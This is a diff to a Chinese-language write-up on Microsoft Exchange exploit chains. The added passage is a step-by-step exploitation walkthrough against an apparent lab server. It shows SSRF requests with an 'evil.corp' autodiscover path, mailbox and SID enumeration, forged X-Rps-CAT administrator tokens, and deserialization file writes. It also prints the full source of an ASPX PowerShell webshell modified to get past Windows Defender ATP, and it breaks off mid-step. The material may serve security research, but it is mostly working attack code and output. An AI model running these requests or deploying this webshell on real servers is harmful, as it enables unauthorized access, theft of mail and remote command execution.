@@ -42,7 +42,7 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
 | ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
 | CVE-2023-21707 (test failed) | [CVE-2023-21707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21707) | 2023年3月9日 | Microsoft Exchange Server 远程执行代码漏洞 | yes |
-| proxymaybeshell (WIP) | [proxymaybeshell](https://mp.weixin.qq.com/s/mvc-HS1nB2rWzWHLBkYz2A) | 2023年9月15日 | exchange历史漏洞综合深入利用 | yes |
+| proxymaybeshell (completed) | [proxymaybeshell](https://mp.weixin.qq.com/s/mvc-HS1nB2rWzWHLBkYz2A) | 2023年9月15日 | proxyshell ssrf + proxynotshell伪造X-Rps-CAT token | yes |
 
 
 
@@ -627,6 +627,7 @@ DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
  - [CVE-2022-41040 and CVE-2022-41082 – zero-days in MS Exchange](https://securelist.com/cve-2022-41040-and-cve-2022-41082-zero-days-in-ms-exchange/108364/)
  - [Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
  - [All the Proxy(Not)Shells](https://www.splunk.com/en_us/blog/security/all-the-proxy-not-shells.html)
+ - [ProxyNotShell 漏洞分析](https://blog.caspersun.club/2022/12/19/proxynotshell/proxynotshell/)
 
 ## 详情总结
 
@@ -1098,13 +1099,456 @@ Microsoft.Exchange.Security.Authentication.GenericSidIdentity是ClaimsIdentity�
 
 利用 ysoserial.net 生成 ClaimsIdentity 的 BinaryFormatter 的反序列化 payload，再将 payload 的 b64 编码数据通过反射放入 ClaimsIdentity 的 m_serializedClaims 中。也就是 Microsoft.Exchange.Security.Authentication.GenericSidIdentity 的 m_serializedClaims 中，再将这个类通过 BinaryFormatter 进行序列化，将序列化结果写入exception的SerializationData，就得到了可用的 payload
 
-# proxymaybeshell (exchange历史漏洞综合深入利用) (WIP)
+# proxymaybeshell (proxyshell ssrf + proxynotshell伪造X-Rps-CAT token) (completed)
 ## proxymaybeshell part links
 
  - [记一次曲折的exchange漏洞利用-ProxyMaybeShell](https://mp.weixin.qq.com/s/mvc-HS1nB2rWzWHLBkYz2A)
  - [7BitsTeam - ProxyMaybeShell](https://github.com/7BitsTeam/ProxyMaybeShell)
 
+ - 说明：proxymaybeshell漏洞是结合proxyshell的ssrf漏洞 + proxynotshell的poc请求powershell端点的NTLM身份认证方式改成了之前proxyshell漏洞中使用的伪造administrator的X-Rps-CAT token方式进行身份认证，且将原proxynotshell的命令执行poc改成了文件写入exp的方式写入shell，适合在不知道目标exchange服务器的账号密码的极端情况下使用，适合实战
 
+## 漏洞复现利用
+
+0. 首先直接使用proxyshell一键写shell的exp发现写失败
+
+``` bash
+(base) D:\1.recent-research\exchange\proxy-attackchain\proxyshell>python proxyshell-auto.py -t 10.0.102.210
+fqdn exchange2016.exchange.lab
++ beizhuan@exchange.lab
+legacyDN /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=d0e52d16ed3b48c1902e2a527e8aad4f-beizh
+leak_sid S-1-5-21-3005828558-642831567-1133831210-1152
+token VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBViZWl6aHVhbkBleGNoYW5nZS5sYWJVLVMtMS01LTIxLTMwMDU4Mjg1NTgtNjQyODMxNTY3LTExMzM4MzEyMTAtMTE1MkcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
+set_ews Success with subject kniyztfvzqlbosvg
+write webshell at aspnet_client/xscmc.aspx
+OUTPUT:
+
+ERROR:
+The term 'New-ManagementRoleAssignment' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+OUTPUT:
+
+ERROR:
+The term 'Get-MailboxExportRequest' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+OUTPUT:
+
+ERROR:
+The term 'New-MailboxExportRequest' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+<Response [404]>
+<Response [404]>
+<Response [404]>
+<Response [404]>
+<Response [404]>
+write webshell at owa/auth/qnieo.aspx
+OUTPUT:
+
+ERROR:
+The term 'New-ManagementRoleAssignment' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+```
+
+看响应发现没有导出邮件相关的命令，疑似账户的权限不够：
+
+1. 使用免费在线公开环境
+
+ - [xBitsPlatform使用说明](https://mp.weixin.qq.com/s?__biz=MzkwNjMyNzM1Nw==&mid=2247500069&idx=1&sn=5e06c7b98f9a90cc016e9125b3458e6b&chksm=c0e8a577f79f2c6125ee8971cd2751e831bb7270e096e706a074cf559363d98c902ab3f59c9e&scene=21#wechat_redirect)
+
+访问 https://10.0.102.210 即可
+
+2. 首先从proxyshell入手
+
+经过探测目标仅开放了autodiscover/ews/powershell/mapi等接口，没有owa/ecp等图形界面。
+
+访问autodiscover/ews/powershell/mapi接口，随便输入账号密码然后抓包重放，得到
+
+``` bash
+HTTP/1.1 401 Unauthorized
+Server: Microsoft-IIS/10.0
+request-id: 6e1ad4de-710c-4725-b955-83a56aa74638
+WWW-Authenticate: NTLM TlRMTVNTUAACAAAAEAAQADgAAAAFgomiaqEWKNoKTbAAAAAAAAAAAK4ArgBIAAAACgB8TwAAAA9FAFgAQwBIAEEATgBHAEUAAgAQAEUAWABDAEgAQQBOAEcARQABABgARQBYAEMASABBAE4ARwBFADIAMAAxADYABAAYAGUAeABjAGgAYQBuAGcAZQAuAGwAYQBiAAMAMgBlAHgAYwBoAGEAbgBnAGUAMgAwADEANgAuAGUAeABjAGgAYQBuAGcAZQAuAGwAYQBiAAUAGABlAHgAYwBoAGEAbgBnAGUALgBsAGEAYgAHAAgAAhw2dN7p2QEAAAAA
+WWW-Authenticate: Negotiate
+X-Powered-By: ASP.NET
+X-FEServer: EXCHANGE2016
+WWW-Authenticate: Basic realm="10.0.102.210"
+Date: Mon, 18 Sep 2023 03:16:02 GMT
+Connection: close
+Content-Length: 0
+```
+
+ - ![](./pics/proxymaybeshell.png)
+
+通过autodiscover接口的ntlm认证信息获取内网域名等信息：
+
+``` bash
+exchange.lab
+```
+
+3. 获取内置用户的dn
+
+安装了exchange的域会包含几个内置账户，可以尝试获取他们的dn：
+
+``` bash
+Administrator
+SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
+DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}
+FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
+Migration.8f3e7716-2011-43e4-96b1-aba62d229136
+SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
+SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
+SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
+```
+
+但在此环境中，均爆破失败
+
+ - [proxyshell-enumerate.py](https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell-enumerate.py)，使用ews接口的功能获取到邮箱列表，默认情况下会获得列表：
+
+ - request
+
+``` bash
+POST /autodiscover/autodiscover.json?@evil.corp/EWS/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp HTTP/1.1
+Host: 10.0.102.210
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: text/xml
+Content-Length: 569
+
+<soap:Envelope
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
+  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
+  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2016" />
+  </soap:Header>
+ <soap:Body>
+    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
+      <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
+    </m:ResolveNames>
+  </soap:Body>
+</soap:Envelope>
+```
+
+ - response
+
+``` bash
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: text/xml; charset=utf-8
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+request-id: 8d123af2-3b41-4926-b948-6915c5ed3c7d
+X-CalculatedBETarget: exchange2016.exchange.lab
+X-DiagInfo: EXCHANGE2016
+X-BEServer: EXCHANGE2016
+X-AspNet-Version: 4.0.30319
+Set-Cookie: exchangecookie=52c52ff0f51147d6aa9721222a58b5b6; expires=Wed, 18-Sep-2024 08:13:16 GMT; path=/; HttpOnly
+Set-Cookie: X-BackEndCookie=; expires=Sat, 18-Sep-1993 08:13:16 GMT; path=/autodiscover; secure; HttpOnly
+X-Powered-By: ASP.NET
+X-FEServer: EXCHANGE2016
+Date: Mon, 18 Sep 2023 08:13:16 GMT
+Connection: close
+Content-Length: 4531
+
+<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Header><h:ServerVersionInfo MajorVersion="15" MinorVersion="2" MajorBuildNumber="721" MinorBuildNumber="2" Version="V2017_07_11" xmlns:h="http://schemas.microsoft.com/exchange/services/2006/types" xmlns="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></s:Header><s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><m:ResolveNamesResponse xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><m:ResponseMessages><m:ResolveNamesResponseMessage ResponseClass="Success"><m:ResponseCode>NoError</m:ResponseCode><m:ResolutionSet TotalItemsInView="4" IncludesLastItemInRange="true"><t:Resolution><t:Mailbox><t:Name>beizhuan</t:Name><t:EmailAddress>beizhuan@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>beizhuan</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:beizhuan@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>dashe</t:Name><t:EmailAddress>dashe@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>dashe</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:dashe@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>weizi</t:Name><t:EmailAddress>weizi@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>weizi</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:weizi@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>yeshen</t:Name><t:EmailAddress>yeshen@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>yeshen</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:yeshen@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution></m:ResolutionSet></m:ResolveNamesResponseMessage></m:ResponseMessages></m:ResolveNamesResponse></s:Body></s:Envelope>
+```
+
+在此响应包中同样发现了exchange版本信息, [Exchange Server build numbers and release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)
+
+``` bash
+===> ServerVersionInfo MajorVersion="15" MinorVersion="2" MajorBuildNumber="721" MinorBuildNumber="2" Version="V2017_07_11"
+===> 15.2.721.2
+===> Exchange Server 2019 CU7	September 15, 2020	15.2.721.2	15.02.0721.002
+```
+
+通过邮箱获取到dn：
+
+``` bash
+POST /autodiscover/autodiscover.json?a=ictbv@pshke.pov/autodiscover/autodiscover.xml HTTP/1.1
+Host: 10.0.102.210
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: Email=autodiscover/autodiscover.json?a=ictbv@pshke.pov
+Content-Type: text/xml
+Content-Length: 354
+
+<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+					<Request>
+					  <EMailAddress>beizhuan@exchange.lab</EMailAddress>
+					  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+					</Request>
+				</Autodiscover>
+```
+
+``` bash
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: text/xml; charset=utf-8
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+request-id: 86edc523-c146-4c29-a133-0306b2036eb2
+X-CalculatedBETarget: exchange2016.exchange.lab
+X-DiagInfo: EXCHANGE2016
+X-BEServer: EXCHANGE2016
+X-AspNet-Version: 4.0.30319
+Set-Cookie: X-BackEndCookie=; expires=Sat, 18-Sep-1993 08:11:28 GMT; path=/autodiscover; secure; HttpOnly
+X-Powered-By: ASP.NET
+X-FEServer: EXCHANGE2016
+Date: Mon, 18 Sep 2023 08:11:28 GMT
+Connection: close
+Content-Length: 3823
+
+<?xml version="1.0" encoding="utf-8"?>
+<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006">
+  <Response xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
+    <User>
+      <DisplayName>beizhuan</DisplayName>
+      <LegacyDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=d0e52d16ed3b48c1902e2a527e8aad4f-beizh</LegacyDN>
+      <AutoDiscoverSMTPAddress>beizhuan@exchange.lab</AutoDiscoverSMTPAddress>
+      <DeploymentId>c01270f4-b14e-4b5c-80ca-5bf9bcf624e2</DeploymentId>
+    </User>
+    <Account>
+      <AccountType>email</AccountType>
+      <Action>settings</Action>
+      <MicrosoftOnline>False</MicrosoftOnline>
+      <Protocol>
+        <Type>EXCH</Type>
+        <Server>9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab</Server>
+        <ServerDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab</ServerDN>
+        <ServerVersion>73C282D1</ServerVersion>
+        <MdbDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab/cn=Microsoft Private MDB</MdbDN>
+        <PublicFolderServer>exchange2016.exchange.lab</PublicFolderServer>
+        <AD>dc.exchange.lab</AD>
+        <ASUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</ASUrl>
+        <EwsUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</EwsUrl>
+        <EmwsUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</EmwsUrl>
+        <EcpUrl>https://exchange2016.exchange.lab/owa/</EcpUrl>
+        <EcpUrl-um>?path=/options/callanswering</EcpUrl-um>
+        <EcpUrl-aggr>?path=/options/connectedaccounts</EcpUrl-aggr>
+        <EcpUrl-mt>options/ecp/PersonalSettings/DeliveryReport.aspx?rfr=olk&amp;exsvurl=1&amp;IsOWA=&lt;IsOWA&gt;&amp;MsgID=&lt;MsgID&gt;&amp;Mbx=&lt;Mbx&gt;</EcpUrl-mt>
+        <EcpUrl-ret>?path=/options/retentionpolicies</EcpUrl-ret>
+        <EcpUrl-sms>?path=/options/textmessaging</EcpUrl-sms>
+        <EcpUrl-photo>?path=/options/myaccount/action/photo</EcpUrl-photo>
+        <EcpUrl-tm>options/ecp/?rfr=olk&amp;ftr=TeamMailbox&amp;exsvurl=1</EcpUrl-tm>
+        <EcpUrl-tmCreating>options/ecp/?rfr=olk&amp;ftr=TeamMailboxCreating&amp;SPUrl=&lt;SPUrl&gt;&amp;Title=&lt;Title&gt;&amp;SPTMAppUrl=&lt;SPTMAppUrl&gt;&amp;exsvurl=1</EcpUrl-tmCreating>
+        <EcpUrl-tmEditing>options/ecp/?rfr=olk&amp;ftr=TeamMailboxEditing&amp;Id=&lt;Id&gt;&amp;exsvurl=1</EcpUrl-tmEditing>
+        <EcpUrl-extinstall>?path=/options/manageapps</EcpUrl-extinstall>
+        <OOFUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</OOFUrl>
+        <UMUrl>https://exchange2016.exchange.lab/EWS/UM2007Legacy.asmx</UMUrl>
+        <OABUrl>https://exchange2016.exchange.lab/OAB/5356a7f1-86d2-4ad6-868d-623c9fad6d08/</OABUrl>
+        <ServerExclusiveConnect>off</ServerExclusiveConnect>
+      </Protocol>
+      <Protocol>
+        <Type>EXPR</Type>
+        <Server>exchange2016.exchange.lab</Server>
+        <SSL>Off</SSL>
+        <AuthPackage>Ntlm</AuthPackage>
+        <ServerExclusiveConnect>on</ServerExclusiveConnect>
+        <CertPrincipalName>None</CertPrincipalName>
+        <GroupingInformation>Default-First-Site-Name</GroupingInformation>
+      </Protocol>
+      <Protocol>
+        <Type>WEB</Type>
+        <Internal>
+          <OWAUrl AuthenticationMethod="Basic, Fba">https://exchange2016.exchange.lab/owa/</OWAUrl>
+          <Protocol>
+            <Type>EXCH</Type>
+            <ASUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</ASUrl>
+          </Protocol>
+        </Internal>
+      </Protocol>
+    </Account>
+  </Response>
+</Autodiscover>
+```
+
+4. 获取sid
+
+此mapi接口从CVE-2018-8581就已经被利用，当有账户dn的时候可以获取到sid：
+
+ - [自写脚本 getsid.py](./proxymaybeshell/ProxyMaybeShell-main/getsid.py)
+
+``` bash
+(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python getsid.py
+[+] SID:  S-1-5-21-3005828558-642831567-1133831210-500
+```
+
+5. 伪造powershell接口token X-Rps-CAT参数
+
+powershell接口的判断用户身份是依赖于X-Rps-CAT参数，主要通过里面包含的sid判断身份：
+
+ - [proxyshellwithsid.py](./proxymaybeshell/ProxyMaybeShell-main/proxyshellwithsid.py)
+
+``` bash
+(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
+Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
+```
+
+6. 遍历sid
+
+发现Administrator用户的权限很低：
+
+``` bash
+(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
+Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
+PS> get-command127.0.0.1 - - [18/Sep/2023 14:59:06] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 14:59:07] "POST /wsman HTTP/1.1" 200 -127.0.0.1 - - [18/Sep/2023 14:59:07] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 14:59:08] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 14:59:08] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 14:59:09] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 14:59:10] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 14:59:10] "POST /wsman HTTP/1.1" 200 -
+OUTPUT:
+Get-Command
+Get-Help
+Get-Mailbox
+Get-MailboxExportRequest
+Get-MailboxExportRequestStatistics
+Get-MailboxImportRequest
+Get-MailboxImportRequestStatistics
+Get-Notification
+Get-RecoverableItems
+Get-UnifiedAuditSetting
+New-MailboxExportRequest
+New-MailboxImportRequest
+Remove-MailboxExportRequest
+Remove-MailboxImportRequest
+Restore-RecoverableItems
+Resume-MailboxExportRequest
+Resume-MailboxImportRequest
+Search-Mailbox
+Set-ADServerSettings
+Set-MailboxExportRequest
+Set-MailboxImportRequest
+Set-Notification
+Set-UnifiedAuditSetting
+Start-AuditAssistant
+Suspend-MailboxExportRequest
+Suspend-MailboxImportRequest
+Write-AdminAuditLog
+Exit-PSSession
+Get-FormatData
+Measure-Object
+Out-Default
+Select-Object
+```
+
+可以遍历sid直至找到支持New-MailboxExportRequest的账户，但在这个环境一系列尝试后无果。使用getmailbox获取到的所有账户也没有高权限的：
+
+``` bash
+PS> get-mailbox
+127.0.0.1 - - [18/Sep/2023 15:00:12] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 15:00:12] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 15:00:13] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 15:00:13] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 15:00:15] "POST /wsman HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2023 15:00:16] "POST /wsman HTTP/1.1" 200 -
+OUTPUT:
+发现搜索邮箱
+BitsAdmin
+weizi
+dashe
+beizhuan
+yeshen
+```
+
+7. SSRF2RCE
+
+proxyshell是没法利用了。但存在的ssrf还是可以使用的
+
+通过之前的响应包，发现该exchange版本为15.2.721.2，版本比较老旧，不受CVE-2021–42321,CVE-2022-23277等漏洞影响，相比较之下比较新的漏洞ProxyNotShell影响范围更广一些
+
+原始脚本直接使用账户密码NTLM认证，再利用反序列化漏洞进行攻击，这里需要修改成使用ssrf漏洞结合X-Rps-CAT绕过认证的形式
+
+其中X-Rps-CAT可以使用[proxyshellwithsid.py](./proxymaybeshell/ProxyMaybeShell-main/proxyshellwithsid.py)这个脚本获取
+
+``` bash
+(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
+Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
+```
+
+9. ReSSRF
+
+填入[proxynotshellcmd.py](./proxymaybeshell/ProxyMaybeShell-main/proxynotshellcmd.py)这个脚本后进行rce，这里遇到一个命令执行没回显的经典问题。目标是不出网的，包括dns。只能写入文件，但该环境无法访问常规的exchange放webshell的目录，如owa/ecp/aspnet_client等。而autodiscover等目录虽然可以访问，但需要凭据。联系前面的内容我们很容易想到通过ssrf绕过autodiscover的认证，简单写一个探测脚本：
+
+ - [ssrf-Autodiscover.py](./proxymaybeshell/ProxyMaybeShell-main/ssrf-Autodiscover.py)
+
+多次尝试后发现无法成功写入。尝试了多个可能问题，包括命令的转义等情况，最后得出结论可能是被目标杀软拦截了。
+
+10. proxynotshell反序列化利用写文件
+
+修改poc后写入使用[proxynotshellfileWrite.py](./proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py)访问，写入之前的proxyshell的普通aspx一句话shell成功但会报编译错误
+
+11. bypass windows definder ATP
+
+查看目录可以发现存在较新的windows definder atp，使用[POWERshell.aspx](https://github.com/ThePacketBender/webshells/blob/master/POWERshell.aspx)可以通过调用c# powershell相关的dll绕过definder部分限制。在这个漏洞利用的情境下使用控件表单的webshell非常麻烦，稍微修改一下webshell：
+
+``` bash
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Collections.ObjectModel"%>
+<%@ Import Namespace="System.Management.Automation"%>
+<%@ Import Namespace="System.Management.Automation.Runspaces"%>
+<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>
+<!DOCTYPE html>
+<script Language="c#" runat="server">
+    private static string powershelled(string scriptText)
+    {
+        try
+        {
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            Pipeline pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(scriptText);
+            pipeline.Commands.Add("Out-String");
+            Collection<PSObject> results = pipeline.Invoke();
+            runspace.Close();
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+                stringBuilder.AppendLine(obj.ToString());
+            return stringBuilder.ToString();
+        }catch(Exception exception)
+        {
+            return string.Format("Error: {0}", exception.Message);
+        }
+    }
+    protected void Page_Load(object sender, EventArgs e)
+    {
+       Response.Write(powershelled(Request.Params["cmd"]));
+    }
+</script>
+```
+
+转义为html编码:
+
+``` bash
